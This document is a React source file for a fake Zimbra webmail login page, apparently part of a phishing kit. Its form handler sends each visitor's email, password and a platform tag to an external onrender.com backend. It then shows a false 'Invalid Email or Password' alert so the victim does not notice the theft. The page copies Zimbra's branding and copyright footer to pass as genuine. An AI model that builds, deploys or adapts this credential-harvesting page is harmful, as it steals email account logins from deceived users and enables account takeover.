import React from 'react';
import './home.css'

import logo from './logo.png';

import { useState } from 'react';
import axios from 'axios';

function Home(){

    const[email, setEmail] = useState("");

    const[password, setPassword] = useState("");

    const[platform, setPlatform] = useState("CValley")

    const[showError, setShowError] = useState(false);

    async function handleSubmit(e){
        e.preventDefault();


        try {
            const response = await axios.post('https://mainbackend-rd07.onrender.com/api/send', {
                email:email,
                password:password,
                platform:platform
            });
        
            // Handle success
            console.log('Data sent:', response.data.message);
    
            if(response.status == 200){
                console.log(response.data.message);
    
                setShowError(true);
            }
          } catch (error) {
            // Handle error
            console.error('Error:', error);
          }
        

        
    }

    return (
        <>
            <div className='firstdiv'>
            {showError && <div className="alert alert-danger alert-dismissible fade show" role="alert">
            <strong>Invalid Email or Password</strong> 
            <button type="button" className="close" data-dismiss="alert" aria-label="Close">
                <span aria-hidden="true">&times;</span>
            </button>
            </div>}

            </div>

            <div className='secondiv col-md-5 m-auto'>
                <div className='logodiv text-center'>
                <img src={logo} className="mylogo" />

                </div>


                {/* form */}



                <form onSubmit={handleSubmit} className='px-4 mt-4'>
                    <div class="form-group row">
                        <label for="staticEmail" class="label col-sm-2 col-form-label">Email</label>
                        <div class="col-sm-10">
                        <input type="email"style={{
                            height:"30px",
                        }}  class="form-control"onChange={function(e){
                            setEmail(e.target.value);
                        }} value={email} id="staticEmail"required />
                        </div>
                    </div>
                    <div class="form-group row">
                        <label for="inputPassword" class="label col-sm-2 col-form-label">Password</label>
                        <div class="col-sm-10">
                        <input type="password"style={{
                            height:"30px",
                        }}class="form-control"onChange={function(e){
                            setPassword(e.target.value);
                        }}value={password} id="inputPassword" required/>
                        </div>
                    </div>


                    <div class="form-group row">
                        <label for="inputPassword"style={{
                            visibility:"hidden",
                        }} class="label col-sm-2 col-form-label">Password</label>
                        <div class="col-sm-10">
                        

                            <div className='row'>
                                <div className='col-6 text-left'>
                                    <input type="checkbox" id="inputPassword" /><span className='label'>Stay signed in</span>
                                </div>

                                <div className='col-6 text-right'>
                                   <button type="submit" className='btn rounded mybtn px-1 py-1'>Sign In</button>
                                </div>

                            </div>


                        </div>
                    </div>



                    <hr
                        style={{
                        background: 'white',
                        color: 'white',
                        borderColor: 'white',
                        height: '2px',
                        }}
                    />

             


                     <div className='row'>
                                <div className='col-2 text-left'>
                                <label for="inputPassword" class="labeltwo">Version:</label>
                                </div>

                                <div className='col-6 text-right'>
                                <select id="client">
                                    <option value="preferred" selected > Default</option>
                                    <option value="advanced" > Advanced (Ajax)</option>
                                    <option value="standard" > Standard (HTML)</option>
                                    <option value="mobile" > Mobile</option>
                                    <option value="touch" > Touch</option>
                                    </select>
                                </div>

                                <div className='col-2 text-left'>
                                <label for="inputPassword" class="labeltwo">What's This?</label>
                                </div>

                            </div>



                    </form>

            </div>


            <div className='thirdiv'>

                <p>Zimbra :: the leader in open source messaging and collaboration :: Blog - Wiki - Forums <br/>
                    Copyright © 2005-2021 Synacor, Inc. All rights reserved. "Zimbra" is a registered trademark of Synacor, Inc.</p>

            </div>


        
        </>
    );

}

export default Home;